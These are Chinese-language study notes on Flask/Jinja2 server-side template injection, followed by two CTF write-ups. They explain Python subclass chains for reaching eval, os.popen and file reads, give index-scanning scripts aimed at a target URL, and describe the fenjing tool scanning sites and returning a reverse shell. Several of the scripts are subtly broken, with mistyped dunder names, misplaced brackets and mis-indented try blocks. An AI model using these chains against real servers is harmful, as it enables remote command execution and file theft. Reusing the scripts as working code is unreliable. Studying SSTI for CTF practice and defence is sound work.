# SSTI模版注入-学习笔记
模板注入 SSTI(Server-Side Template Injection)」 ，数据传递 ** 就是可控的输入点，以 **Jinja2 举例，Jinja2 在渲染的时候会把 {{}} 包裹的内容当做变量解析替换，所以当我们传入 {{表达式}} 时，表达式就会被渲染器执行。

## python venv
venv虚拟环境：创建和管理虚拟环境的模块



可以把它想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的（就像你在Windows主机上通过Vmware跑一台Ubuntu或者CentOS的虚拟主机一样），也就是说你在venv下通过pip安装的Python第三方模块是不会存在于你本机的环境下的。



在ubuntu里安装python venv 和 flask



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744453804691-aae81eef-20ab-4fea-a340-b024fc04dd85.png)

法一：绝对路径

/opt/flask1/bin/python3 demo.py

法二：

进入flask1虚拟环境

cd /opt

cd flask1

source ./bin/activate



运行脚本

python3 demo.py



退出虚拟环境

deactivate



vim编辑器

vim demo.py

按i即可进入输入

按esc :wq 保存文件并退出

:%d 清空所有内容

## flask应用介绍及搭建
flask是一个使用python编写的轻量级web应用框架，是一种web服务器



其WSGI工具箱采用Werkzeug，模板引|擎则使用Jinja2。Flask使用BSD授权。



Flask的特点有：良好的文档、丰富的插件、包含开发服务器和调试（debugger)、集成支持单元测试、RESTful请求调度、支持安全cookies、基于Unicode。



Python可直接用flask启动一个web服务页面。



```plain
from flask import Flask
app = Flask(__name__)

@app.route('/hello') //路由 基于浏览器输入的字符串寻址
def hello():
  return "hello benben"
  
if __name__=='__main__':
  app.run(debug=True,host='0.0.0.0')
```

host='0.0.0.0' 监听所有物理接口

debug 会弹出具体错误

## flask变量及方法
通过向规则参数添加变量部分，可以动态构建url



```plain
from flask import Flask
app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
  return "hello %s"% name
  
if __name__=='__main__':
  app.run(debug=True)
```

%s 字符串 %d 整数 %f浮点值



以下为执行结果：



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744456378441-f16a8aa2-c452-4ba9-923b-fbf45b805d1f.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744456385775-9244bd81-e8bb-4698-8edd-d2b3d805fc03.png)



也可以传入数字



```plain
from flask import Flask
app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
  return "hello %s" % name
@app.route('/int/<int:postID>')
def id(postID):
  return "%d" % postID
  
if __name__=='__main__':
  app.run(host='0.0.0.0',debug=True,port=5001)
```



**flask http方法**

```plain
from flask import Flask, redirect, url_for, request, render_template
app = Flask(__name__)
@app.route('/')
def index():
  return render_template("index.html")
@app.route('/success/<name>')
def success(name):
  return 'welcome %s' % name

@app.route('/login',methods = ['POST','GET'])
def login():
  if request.method == 'POST':
    print(1)
    user = request.form['ben']
    return redirect(url_for('success',name = user))
  else:
    print(2)
    user = request.args.get('ben')
    return redirect(url_for('success',name = user))

if __name__=='__main__':
  app.run()
```

```plain
<html>
  <body>
    <form action = "http://localhost:5000/login" method = "post">
      <p>Enter Name:</p>
      <p><input type = "text" name = "ben" /></p>
      <p><input type = "submit" value = "submit" /></p>
    </form>
  </body>
</html>
```



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744459245309-8a1d5ad3-8cce-496e-976e-9fe6f5f99cd6.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744459484259-aee6bde1-9c60-422e-94fc-a3e529a20c93.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744459260341-9581be67-d2e9-4bae-bc2b-7b4a7ec8bc91.png)



## flask模版
视图函数的主要作用是生成请求的响应：处理业务逻辑、返回响应内容



使用模板：使用静态的页面html展示动态的内容



模板是一个响应文本的文件，其中占用符（变量）表示动态部分，告诉模板引擎其具体的值需要从使用的数据中获取。



使用真实值替换变量，再返回最终得到的字符串，这个过程称为”渲染”。Flask使用Jinja2这个模板引|擎来渲染模板。



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744460915722-9d6a42eb-faf7-4b30-a47c-23ee0b4b3f92.png)



render_template:加载html文件，默认路径在templates目录下

render_template_string:渲染字符串，直接定义内容

## 模板注入漏洞
### flask漏洞
flask代码不严谨很危险  --SSTI



可能造成任意文件读取和rce远程控制后台系统



漏洞成因：渲染模版时没有严格控制对用户的输入



使用了危险的模板导致用户可以和flask程序交互，比如执行eval、system、file等函数



区分以下两种

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744463152764-0ea2c391-9380-4400-a783-93e9543bab32.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744463412037-9a9692c1-a1f5-4d0d-a1f0-d45603bd716a.png)



{{7*7}}可以用来检测漏洞



比如说 ?ben={{".__class__.__mro_}} 当成指令来执行



判断ssti类型



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744560806068-828ca2a7-e69f-474d-908b-af40f3f6d4a3.png)

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744560886037-e09f7838-0756-4ffd-aa7b-16e021e8b8a4.png) 

## python继承关系和魔术方法
### 继承关系
子类调用父类下的其它子类



python flask脚本没有办法直接执行python指令



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744561639815-df5d0ec9-b1d2-4d10-a9f1-95c32c15055c.png)



classA可以通过object调用classB的eval



### 魔术方法


![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744562216328-50b7b7ad-8a37-41ac-9f87-360c98bbdc61.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744563005493-786d84c8-d1c2-4b4f-a79b-959ca96a6f09.png)



__class__当前类



__class__.__base__当前类的父类



__class__.__mro__罗列所有父类关系



c.__class__.__mro__[1] 查看从低到高第[1]个类，如在这里就是B类



__class__.__subclasses__()查看当前类下的所有子类



c.__class__.__mro__[1].__subclasses__() 此时是C和D类



c.__class__.__mro__[1].__subclasses__()[1]此时是D类



总结：



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744563844316-ab906f59-2032-4a45-8b66-ebbc8a056ce4.png)

### 


### 检查漏洞
![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744564371542-1edf1042-5dbd-4333-ba93-25121a2ddb02.png)



### ![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744564340392-1a1adefe-6c7e-4459-b92d-388f6d81eae1.png)


![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744564449396-0f875f26-d7f2-462e-8038-0a193a53d91a.png)



找os._wrap_close在哪里



先通过查找找到在第118行有该模块。通过[117]调用（因为从0开始计数，而查找功能从1开始计数）



.__int__检测是否被加载出来



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744568322663-db1625ba-bb5b-4dee-938a-b21fa8015f8c.png)



__global__查看全部全局变量有哪些可以使用的方法函数



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744568413547-55a27612-44f7-47b1-b9df-3ed205cc38c7.png)



用['函数名']加载要使用的函数



先加载内嵌函数__builtins__调用eval函数



引入os模块然后调用popen函数



.read() 是结果有回显



或者直接调用popen函数（不加载内嵌函数），如下图



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744568869349-0fdf40c0-b846-44db-83d9-78a81a685021.png)



## SSTI常用注入模块
### 文件读取
查找子类_frozen_importlib_external.FileLoader



该函数可以进行文件读取



python脚本：



POST提交"name"的值，通过for循环查找所需字符串的编号



'name'具体写什么看网页源代码



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744654458003-d26313c3-337e-472d-b426-3e4d57692275.png)



```plain
import requests
url= input("请输入URL链接：")
for i in range(500):
  data = {"name": "{{().__class.__base__.__subclasses__()["+str(i)+"]}}"}
  try:
    response = requests.post(url,data=data)
    #print(response.text)
    if response.status_code == 200:
      if'_frozen_importlib_external.FileLoader' in response.text:
        print(i)
  except :
    pass
```



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744654731211-8f7149d4-02ef-462e-a8e8-1c51f3a9ec64.png)



注意get_data第一个参数为0



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744654937191-a571426c-b7dc-4817-888a-97144653fa95.png)



### 内建eval函数执行命令
内建函数：python在执行脚本时自动加载的函数



python脚本查看可利用内建函数eval的模块



```plain
import requests
url=input('请输入URL链接: ')
for i in range(500):
  data ={"name":
"{{().__class__.__base__.subclasses__(["+str(i)+"].__init__.__globals__['__builtins__']}}"}
try:
  response = requests.post(url,data=data)
  #print(response.text)
  if response.status_code == 200:
    if 'eval' in response.text:
      print(i)
  except:
    pass
```



调用eval模块



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744655632620-3ad4ecdd-058a-4037-ae2a-38d1d9ac4865.png)



### os模块执行命令（常用）
python脚本：



```plain
import requests
url=input('请输入URL链接: ')
for i in range(500):
  data ={"name":
"{{().__class__.__base__.subclasses__(["+str(i)+"].__init__.__globals__}}"}
try:
  response = requests.post(url,data=data)
  #print(response.text)
  if response.status_code == 200:
    if 'os.py' in response.text:
      print(i)
  except:
    pass
```



然后调用



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744655700998-1f3c77fa-58a3-470a-b73d-1ef3e13a592b.png)



或者直接调用popen函数



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744568869349-0fdf40c0-b846-44db-83d9-78a81a685021.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_802%2Climit_0)



或者加载内嵌函数



### 其它函数（了解即可）
#### importlib执行命令
![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744655938833-16321776-4af9-4249-be20-1a9305aa1890.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744655965602-4d8837c4-87e6-4ad2-b704-cfe8ccfa33bb.png)



#### linecache函数
![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744656159108-43b4ff38-6828-462f-8029-fa28f5c54d23.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744656229649-450d2e57-f290-4d49-bf38-579892cba632.png)



#### subprocess.Popen函数
![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744656278676-d2b764cb-1134-44bd-84da-998a04efef69.png)





![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744656300179-75e02abf-217e-43be-94e5-39617c33decc.png)



## $fenjing（首选）
进入venv虚拟环境



python3 -m fenjing webui 启动<font style="color:rgb(77, 77, 77);">Fenjing-Web页面</font>

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">开始梭哈</font>



或者<font style="color:rgb(77, 77, 77);">使用scan可以自动的扫描网站，最后反弹一个shell</font>

<font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);"></font>

<font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">python -m fenjing scan --url </font><font style="color:rgb(56, 58, 66);"><</font><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">你的目标url</font><font style="color:rgb(56, 58, 66);">></font>

<font style="color:rgb(56, 58, 66);"></font>

# 题目
##  [SWPU 2024 新生引导]ez_SSTI  
进入nss



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744652207334-786b6d81-bf7b-435a-af97-d0bd589c2991.png)



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744652218900-6114f052-883d-400b-9452-ae35c5f0c043.png)



启动一下fenjing



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744652470864-e59a1d77-dc87-49c9-823d-4bafbc668ca6.png)



ls /扫目录



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744652723033-f363ae12-f008-411c-a816-83dbc1599844.png)



拿flag



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744652754261-83de91ab-000c-4576-9ed6-58fefba88be1.png)



## [CSCCTF 2019 Qual]FlaskLight
看源码，得知提交方式为get，name为search

 ![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744652844739-3f8c7eee-96db-491d-acce-f6d34c1d45a0.png)



fenjing跑



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744653162385-b1863322-e262-4c89-bbe1-5d00865a6606.png)



ls扫目录



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744653370270-74074c38-4362-47af-bc0b-369fa76c3364.png)						 						

扫一下flasklight目录



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744653846269-9a05ce4c-ef75-46ee-b945-72accaba5ba2.png)



直接cat coomme_geeeett_youur_flek，拿到flag



![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1744653997400-933c8314-26ea-48cb-8576-d19ff80b6826.png)



